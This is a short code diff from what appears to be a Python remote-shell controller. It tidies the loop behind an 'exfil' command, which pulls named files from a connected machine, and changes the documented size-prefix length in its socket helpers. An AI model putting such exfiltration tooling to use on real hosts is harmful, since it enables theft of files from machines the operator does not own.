@@ -80,9 +80,7 @@ def shell_server(s, PORT):
             # exfil
             elif base == cmds[5]:
                 if re.search('^exfil ([\w\/.~]+ )+$', inp + ' '):
-                    for file in inp.split():
-                        if file == 'exfil':
-                            continue
+                    for file in inp.split()[1:]:
                         resp = shell_exchange(conn, 'exfil ' + file)
                         if 'No such' in resp:
                             print 'psh : {}: {}'.format(resp, file)
@@ -198,7 +196,7 @@ def shell_exchange(conn, req):
 def socksend(s, msg):
     """
         Sends message using socket operating under the convention that the
-        first five bytes received are the size of the following message.
+        first nine bytes received are the size of the following message.
     """
 
     pkg = base64.b64encode(msg)
@@ -215,7 +213,7 @@ def socksend(s, msg):
 def sockrecv(s):
     """
         Receives message from socket operating under the convention that the
-        first five bytes received are the size of the following message.
+        first nine bytes received are the size of the following message.
         Returns the message.
 
         TODO: Under high network loads, it's possible that the initial recv
